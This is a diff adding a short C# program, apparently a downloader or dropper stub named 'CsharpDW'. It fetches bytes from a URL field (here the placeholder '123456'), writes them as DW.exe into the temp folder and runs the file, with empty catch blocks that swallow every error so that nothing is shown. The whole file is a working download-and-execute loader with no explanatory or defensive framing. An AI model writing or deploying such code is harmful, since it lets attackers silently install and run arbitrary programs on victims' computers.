@@ -1,0 +1,42 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Threading;
+
+namespace CsharpDW
+{
+    class Program
+    {
+        static void Main()
+        {
+            try
+            {
+                using (FileStream fs = new FileStream(Path.Combine(Path.GetTempPath(), "DW.exe"), FileMode.Create))
+                {
+                    byte[] payload = DownloadPayload("123456");
+                    fs.Write(payload, 0, payload.Length);
+                }
+                Process.Start(Path.Combine(Path.GetTempPath(), "DW.exe"));
+            }
+            catch { }
+        }
+
+        private static byte[] DownloadPayload(string url)
+        {
+            try
+            {
+                using (WebClient wc = new WebClient())
+                {
+
+                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                    return wc.DownloadData(url);
+                }
+            }
+            catch
+            {
+                return null;
+            }
+        }
+    }
+}
